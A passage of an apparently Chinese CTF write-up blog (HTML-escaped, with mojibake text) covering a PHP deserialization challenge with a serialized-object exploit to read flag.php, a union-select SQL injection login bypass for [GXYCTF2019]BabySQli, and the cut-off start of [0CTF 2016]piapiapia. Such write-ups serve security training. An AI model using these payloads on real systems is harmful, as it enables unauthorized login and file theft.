class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;output&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op === &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;is_valid&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; strlen(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;); &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!(ord(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;]) &amp;gt;= &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; &amp;amp;&amp;amp; ord(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;]) &amp;lt;= &lt;span class=&#34;hljs-number&#34;&gt;125&lt;/span&gt;))&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;&amp;#125;)) &amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(is_valid(&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$obj&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå¯»æ‰¾POPé“¾&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;read()å¯ä»¥è¯»æ–‡ä»¶=&amp;gt;read()ä¼šè¢«process()è°ƒç”¨=&amp;gt;process()ä¼šè¢«&lt;code&gt;__construct()&lt;/code&gt;è¿˜æœ‰&lt;code&gt;__destruct()&lt;/code&gt;è°ƒç”¨&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç”±äº&lt;code&gt;__construct()&lt;/code&gt;ä¼šåˆå§‹åŒ–å¯¼è‡´æ–‡ä»¶åä¸å¯æ§ï¼Œä¸”å…¶å¯ä»¥ç»•è¿‡ï¼Œè€Œ&lt;code&gt;__destruct()&lt;/code&gt;,ä¼šè®©opå¼ºåˆ¶ç­‰äº1ï¼Œä½†æ˜¯è¿™é‡Œç”¨äº†&lt;code&gt;===â€˜2â€™&lt;/code&gt;ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœopä¸ºæ•´å‹2ï¼Œå³å¯ç»•è¿‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;åŒæ—¶è¿™é¢˜æœ‰ä¸€ä¸ªcheckï¼Œæˆ‘ä»¬æŠŠprotectedæ”¹æˆpublicå³å¯ç»•è¿‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;expï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FileHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/tmp/tmpfile&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello World!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write();&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Bad Hacker!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(strlen((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Too long!&amp;quot;&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_put_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Successful!&amp;quot;&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;output&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op === &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; FileHandler;&lt;br&gt;var_dump(urlencode(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;)));&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;GXYCTF2019-BabySQli&#34;&gt;&lt;a href=&#34;#GXYCTF2019-BabySQli&#34; class=&#34;headerlink&#34; title=&#34;[GXYCTF2019]BabySQli&#34;&gt;&lt;/a&gt;[GXYCTF2019]BabySQli&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;æµ‹è¯•å•å¼•å·ä¼šæŠ¥é”™&lt;/li&gt;
&lt;li&gt;union select å­—æ®µæ•°ä¸º3ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ç‚¹ï¼Œå¯èƒ½æ˜¯ç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥&lt;/li&gt;
&lt;li&gt;userä¸ºadminæ—¶æŠ¥wrong passï¼Œuserä¸ºå…¶å®ƒæ—¶æŠ¥wrong userï¼Œè¿™é‡Œå¯èƒ½æ˜¯ç›²æ³¨ç‚¹&lt;/li&gt;
&lt;li&gt; æœ‰ä¸€æ®µç¼–ç ï¼Œbase32+base64è§£ç å¾—åˆ°ï¼š&lt;code&gt;select * from user where username = &amp;#39;$name&amp;#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;é¢˜ç›®è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼š&lt;code&gt;(    )   or    =&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è¦é€šè¿‡æ³¨å…¥æ‹¿åˆ°æ•°æ®åŸºæœ¬æ˜¯ä¸å¯è¡Œçš„ï¼Œè¿™é‡Œçœ‹åˆ°sqlè¯­å¥ä¸­åªæœ‰æŸ¥è¯¢nameå€¼ï¼Œæ²¡æœ‰çœ‹åˆ°passwordï¼Œå¯èƒ½åˆ¤æ–­æ˜¯å¦ç™»å…¥çš„è¯­å¥æ˜¯&lt;code&gt;(select * from user where username = &amp;#39;$name&amp;#39;)[&amp;#39;password&amp;#39;] =md5(password) &lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ­¤æ—¶æ„é€ payload:&lt;code&gt;name=-1&amp;#39; union select 1,&amp;#39;admin&amp;#39;,&amp;#39;e10adc3949ba59abbe56e057f20f883e&amp;#39;#&amp;amp;pw=123456&lt;/code&gt;å³å¯ç™»é™†æˆåŠŸæ‹¿åˆ°flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;0CTF-2016-piapiapia&#34;&gt;&lt;a href=&#34;#0CTF-2016-piapiapia&#34; class=&#34;headerlink&#34; title=&#34;[0CTF 2016]piapiapia&#34;&gt;&lt;/a&gt;[0CTF 2016]piapiapia&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;/&lt;a href=&#34;http://www.zipæ‹¿åˆ°æºç /&#34;&gt;www.zipæ‹¿åˆ°æºç &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;çœ‹æºç åº”è¯¥æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼ŒåŒæ—¶çœ‹åˆ°&lt;code&gt;return preg_replace($safe, &amp;#39;hacker&amp;#39;, $string);&lt;/code&gt;ï¼Œåº”è¯¥æ˜¯å­—ç¬¦é€ƒé€¸ååºåˆ—åŒ–çš„é¢˜ç›®ã€‚åŒæ—¶flagåº”è¯¥åœ¨config.phpä¸­&lt;/li&gt;
&lt;li&gt;å…ˆæ„é€ POPé“¾&lt;/li&gt;
&lt;li&gt;profile.phpå¯ä»¥è¯»æ–‡ä»¶ï¼Œè¦å®ç°ä»»æ„æ–‡ä»¶è¯»å–å°±è¦è¦†ç›–$profile[â€˜photoâ€™]ï¼Œè€Œ$profile[â€˜photoâ€™]åœ¨update.phpä¸­æ§åˆ¶ã€‚æ¥ä¸‹æ¥å°±æ˜¯è¦å¦‚ä½•æŠŠ$profile[â€˜photoâ€™]å˜æˆconfig.php&lt;/li&gt;
